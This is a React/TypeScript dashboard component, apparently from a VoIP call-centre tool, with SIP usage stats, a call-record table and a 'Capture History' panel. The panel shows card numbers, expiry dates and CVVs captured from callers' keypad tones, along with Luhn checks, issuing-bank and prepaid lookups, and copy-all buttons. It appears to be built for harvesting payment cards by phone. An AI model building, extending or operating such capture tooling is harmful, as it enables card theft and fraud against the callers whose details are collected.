import { useEffect, useState } from 'react';
import { wsSend } from '../../hooks/useWebSocket';
import { useWsMessage } from '../../hooks/useWsMessage';
import { useAuthStore } from '../../stores/authStore';
import type { CaptureHistoryEntry } from '../tools/DtmfCaptureModal';

interface CdrRecord {
  id: string;
  startTime: string;
  src: string;
  destination: string;
  duration: number;
  status: 'answered' | 'busy' | 'noanswer' | 'failed';
  cost: number;
  callerid: string;
}

interface SipStat {
  sipUser: string;
  answered: number;
  failed: number;
  total: number;
  minutes: number;
  cost: number;
  asr: number;
}

interface SipUsageTotals {
  answered: number;
  failed: number;
  total: number;
  minutes: number;
  cost: number;
}

/** V1 format: Xm Ys */
function formatDuration(seconds: number): string {
  if (!seconds) return '0s';
  const m = Math.floor(seconds / 60);
  const s = seconds % 60;
  return m > 0 ? `${m}m ${s}s` : `${s}s`;
}

function statusBadge(status: string) {
  switch (status) {
    case 'answered': return 'tag-up';
    case 'busy': return 'tag-ring';
    case 'noanswer': return 'tag-ring';
    default: return 'tag-down';
  }
}

function copyToClipboard(text: string) {
  navigator.clipboard.writeText(text).catch(() => {});
}

// ── SIP Usage Summary Panel ──

function SipUsagePanel() {
  const [stats, setStats] = useState<SipStat[]>([]);
  const [totals, setTotals] = useState<SipUsageTotals | null>(null);
  const [dateFrom, setDateFrom] = useState('');
  const [dateTo, setDateTo] = useState('');
  const usageMsg = useWsMessage<any>('sip_usage_result');

  useEffect(() => {
    wsSend({ cmd: 'get_sip_usage' });
  }, []);

  useEffect(() => {
    if (usageMsg) {
      setStats(usageMsg.stats ?? []);
      setTotals(usageMsg.totals ?? null);
    }
  }, [usageMsg]);

  const fetchUsage = () => {
    wsSend({
      cmd: 'get_sip_usage',
      ...(dateFrom ? { dateFrom } : {}),
      ...(dateTo ? { dateTo } : {}),
    });
  };

  return (
    <div className="glass-panel">
      <div className="panel-header">
        <h2>SIP Usage Summary</h2>
        <span className="text-ct-muted text-xs">{stats.length} SIP users</span>
      </div>

      {/* Date Filters */}
      <div className="flex gap-2 p-3 border-b border-ct-border-solid flex-wrap items-center">
        <input type="date" value={dateFrom} onChange={e => setDateFrom(e.target.value)} className="form-input !py-1.5 !px-2.5 !text-xs" />
        <input type="date" value={dateTo} onChange={e => setDateTo(e.target.value)} className="form-input !py-1.5 !px-2.5 !text-xs" />
        <button onClick={fetchUsage} className="btn btn-sm btn-primary">Search</button>
        <button onClick={() => { setDateFrom(''); setDateTo(''); wsSend({ cmd: 'get_sip_usage' }); }} className="btn btn-sm">Clear</button>
      </div>

      {/* Summary Cards */}
      {totals && (
        <div className="grid grid-cols-2 sm:grid-cols-5 gap-3 p-4">
          {[
            { label: 'Total Calls', value: totals.total, color: '#58a6ff' },
            { label: 'Answered', value: totals.answered, color: '#3fb950' },
            { label: 'Failed', value: totals.failed, color: '#f85149' },
            { label: 'Minutes', value: totals.minutes.toFixed(1), color: '#58a6ff' },
            { label: 'Cost', value: `$${totals.cost.toFixed(2)}`, color: '#d29922' },
          ].map(c => (
            <div key={c.label} className="bg-ct-surface-solid border border-ct-border-solid rounded-[10px] p-3 text-center">
              <div className="text-xl font-bold font-mono" style={{ color: c.color }}>{c.value}</div>
              <div className="text-[11px] text-ct-muted uppercase tracking-wider mt-1">{c.label}</div>
            </div>
          ))}
        </div>
      )}

      {/* Per-SIP Table */}
      {stats.length === 0 ? (
        <div className="empty-state">No SIP usage data for this period.</div>
      ) : (
        <div className="overflow-x-auto">
          <table className="data-table">
            <thead>
              <tr>
                <th>SIP User</th>
                <th>Total</th>
                <th>Answered</th>
                <th>Failed</th>
                <th>Minutes</th>
                <th>Cost</th>
                <th>ASR</th>
              </tr>
            </thead>
            <tbody>
              {stats.map(s => (
                <tr key={s.sipUser}>
                  <td className="font-mono text-ct-accent text-xs">{s.sipUser}</td>
                  <td className="font-mono text-xs">{s.total}</td>
                  <td className="font-mono text-xs text-ct-green">{s.answered}</td>
                  <td className="font-mono text-xs text-ct-red">{s.failed}</td>
                  <td className="font-mono text-xs">{s.minutes.toFixed(1)}</td>
                  <td className="font-mono text-xs text-ct-yellow">{s.cost > 0 ? `$${s.cost.toFixed(2)}` : '-'}</td>
                  <td>
                    <span className={`tag ${s.asr >= 50 ? 'tag-up' : s.asr >= 25 ? 'tag-ring' : 'tag-down'}`}>{s.asr}%</span>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      )}
    </div>
  );
}

// ── Capture History Panel ──

function CaptureHistoryPanel() {
  const [captures, setCaptures] = useState<CaptureHistoryEntry[]>([]);

  useEffect(() => {
    loadCaptures();
    // Re-check periodically in case captures are added from the modal
    const interval = setInterval(loadCaptures, 5000);
    return () => clearInterval(interval);
  }, []);

  const loadCaptures = () => {
    try {
      const data: CaptureHistoryEntry[] = JSON.parse(localStorage.getItem('ct2_capture_history') || '[]');
      setCaptures(data);
    } catch {
      setCaptures([]);
    }
  };

  const clearAll = () => {
    localStorage.removeItem('ct2_capture_history');
    setCaptures([]);
  };

  const copyAll = (c: CaptureHistoryEntry) => {
    const parts: string[] = [];
    if (c.cc) parts.push(`CC: ${c.cc}`);
    if (c.exp) parts.push(`EXP: ${c.exp}`);
    if (c.cvv) parts.push(`CVV: ${c.cvv}`);
    if (c.rawDigits) parts.push(`Raw: ${c.rawDigits}`);
    if (c.luhnValid !== null) parts.push(`Luhn: ${c.luhnValid ? 'Valid' : 'Invalid'}`);
    if (c.binData) {
      const bin = c.binData;
      if (bin.brand) parts.push(`Brand: ${bin.brand}`);
      if (bin.bank) parts.push(`Bank: ${bin.bank}`);
      if (bin.country) parts.push(`Country: ${bin.country}`);
    }
    copyToClipboard(parts.join('\n'));
  };

  if (captures.length === 0) return null;

  return (
    <div className="glass-panel">
      <div className="panel-header">
        <h2>Capture History</h2>
        <div className="flex items-center gap-2">
          <span className="text-ct-muted text-xs">{captures.length} captures</span>
          <button onClick={clearAll} className="btn btn-sm btn-danger">Clear All</button>
        </div>
      </div>
      <div className="space-y-0">
        {captures.map((c, i) => (
          <div key={c.timestamp + '-' + i} className="p-4 border-b border-ct-border-solid/50 last:border-b-0">
            {/* Header */}
            <div className="flex items-center justify-between mb-2">
              <div className="flex items-center gap-2">
                <span className="text-ct-accent font-bold text-sm">#{captures.length - i}</span>
                <span className="text-[11px] text-ct-muted-dark">{new Date(c.timestamp).toLocaleString()}</span>
                <span className={`text-[10px] px-1.5 py-0.5 rounded ${
                  c.reason === 'hangup' ? 'bg-ct-red-bg text-ct-red' : 'bg-ct-border-solid text-ct-muted'
                }`}>{c.reason}</span>
                {c.luhnValid !== null && (
                  <span className={`text-[10px] px-1.5 py-0.5 rounded ${
                    c.luhnValid ? 'bg-ct-green-bg text-ct-green' : 'bg-ct-red-bg text-ct-red'
                  }`}>{c.luhnValid ? 'Luhn Valid' : 'Luhn Invalid'}</span>
                )}
              </div>
              <button onClick={() => copyAll(c)} className="btn btn-sm">Copy All</button>
            </div>

            {/* Fields */}
            <div className="grid grid-cols-1 sm:grid-cols-3 gap-2">
              {[
                { label: 'CC', value: c.cc },
                { label: 'EXP', value: c.exp },
                { label: 'CVV', value: c.cvv },
              ].map(f => f.value ? (
                <div key={f.label} className="bg-ct-surface-solid border border-ct-border-solid rounded-lg p-2">
                  <div className="text-[10px] text-ct-muted uppercase tracking-wider mb-0.5">{f.label}</div>
                  <div className="flex items-center justify-between">
                    <span className="font-mono text-sm text-ct-text">{f.value}</span>
                    <button onClick={() => copyToClipboard(f.value)} className="text-[10px] px-1.5 py-0.5 rounded border border-ct-border-solid text-ct-muted hover:text-ct-text transition-colors">Copy</button>
                  </div>
                </div>
              ) : null)}
            </div>

            {/* BIN Info */}
            {c.binData && (
              <div className="mt-2 text-xs text-ct-muted flex gap-3 flex-wrap">
                {c.binData.brand && <span><span className="text-ct-muted-dark">Brand:</span> {c.binData.brand}</span>}
                {c.binData.type && <span><span className="text-ct-muted-dark">Type:</span> {c.binData.type}</span>}
                {c.binData.bank && <span><span className="text-ct-muted-dark">Bank:</span> {c.binData.bank}</span>}
                {c.binData.country && <span><span className="text-ct-muted-dark">Country:</span> {c.binData.country}</span>}
                {c.binData.prepaid && <span className="text-ct-yellow">Prepaid</span>}
              </div>
            )}

            {/* Raw Digits */}
            {c.rawDigits && (
              <div className="mt-2 font-mono text-xs text-ct-muted-dark">
                <span className="text-ct-border-solid mr-1">Raw:</span>{c.rawDigits}
              </div>
            )}
          </div>
        ))}
      </div>
    </div>
  );
}

// ── Main History Tab ──

export function HistoryTab() {
  const [records, setRecords] = useState<CdrRecord[]>([]);
  const [total, setTotal] = useState(0);
  const [page, setPage] = useState(1);
  const [search, setSearch] = useState('');
  const [dateFrom, setDateFrom] = useState('');
  const [dateTo, setDateTo] = useState('');
  const role = useAuthStore(s => s.role);
  const permissions = useAuthStore(s => s.permissions);
  const selectedSip = useAuthStore(s => s.selectedSipUser);

  const cdrMsg = useWsMessage<any>('cdr_result');

  useEffect(() => {
    fetchCdr(1);
  }, [selectedSip]);

  useEffect(() => {
    if (cdrMsg) {
      setRecords(cdrMsg.records ?? []);
      setTotal(cdrMsg.total ?? 0);
    }
  }, [cdrMsg]);

  const fetchCdr = (p: number, overrides?: { search?: string; dateFrom?: string; dateTo?: string }) => {
    setPage(p);
    wsSend({
      cmd: 'get_cdr',
      page: p,
      perPage: 25,
      search: (overrides?.search ?? search) || undefined,
      dateFrom: (overrides?.dateFrom ?? dateFrom) || undefined,
      dateTo: (overrides?.dateTo ?? dateTo) || undefined,
      targetSip: selectedSip || undefined,
    });
  };

  const showSipUsage = role === 'admin' || role === 'user' || permissions?.cdr;

  return (
    <div className="space-y-5 animate-fade-in" role="tabpanel" id="panel-history">
      {/* SIP Usage Summary */}
      {showSipUsage && <SipUsagePanel />}

      {/* CDR Table */}
      <div className="glass-panel">
        <div className="panel-header">
          <h2>Call History</h2>
          <span className="text-ct-muted text-xs">{total} records</span>
        </div>

        {/* Filters */}
        <div className="flex gap-2 p-3 border-b border-ct-border-solid flex-wrap items-center">
          <input
            type="text"
            value={search}
            onChange={e => setSearch(e.target.value)}
            placeholder="Search number..."
            className="form-input !py-1.5 !px-2.5 !text-xs !w-40"
            onKeyDown={e => e.key === 'Enter' && fetchCdr(1)}
          />
          <input
            type="date"
            value={dateFrom}
            onChange={e => setDateFrom(e.target.value)}
            className="form-input !py-1.5 !px-2.5 !text-xs"
          />
          <input
            type="date"
            value={dateTo}
            onChange={e => setDateTo(e.target.value)}
            className="form-input !py-1.5 !px-2.5 !text-xs"
          />
          <button onClick={() => fetchCdr(1)} className="btn btn-sm btn-primary">Search</button>
          <button onClick={() => { setSearch(''); setDateFrom(''); setDateTo(''); fetchCdr(1, { search: '', dateFrom: '', dateTo: '' }); }} className="btn btn-sm">Clear</button>
        </div>

        {records.length === 0 ? (
          <div className="empty-state">No call records found.</div>
        ) : (
          <div className="overflow-x-auto">
            <table className="data-table">
              <thead>
                <tr>
                  <th>Time</th>
                  <th>Source</th>
                  <th>Destination</th>
                  <th>Duration</th>
                  <th>Status</th>
                  <th>Cost</th>
                </tr>
              </thead>
              <tbody>
                {records.map(r => (
                  <tr key={r.id}>
                    <td className="text-ct-muted text-xs whitespace-nowrap">
                      {new Date(r.startTime).toLocaleString()}
                    </td>
                    <td className="font-mono text-xs">{r.src}</td>
                    <td className="font-mono text-xs">{r.destination}</td>
                    <td className="font-mono text-xs">{formatDuration(r.duration)}</td>
                    <td>
                      <span className={`tag ${statusBadge(r.status)}`}>{r.status.toUpperCase()}</span>
                    </td>
                    <td className="font-mono text-xs text-ct-yellow">
                      {r.cost > 0 ? `$${r.cost.toFixed(2)}` : '-'}
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        )}

        {/* Pagination */}
        {total > 25 && (
          <div className="flex items-center justify-center gap-2 p-3">
            <button onClick={() => fetchCdr(page - 1)} disabled={page <= 1} className="btn btn-sm">Prev</button>
            <span className="text-xs text-ct-muted">Page {page} of {Math.ceil(total / 25)}</span>
            <button onClick={() => fetchCdr(page + 1)} disabled={page * 25 >= total} className="btn btn-sm">Next</button>
          </div>
        )}
      </div>

      {/* Capture History */}
      <CaptureHistoryPanel />
    </div>
  );
}
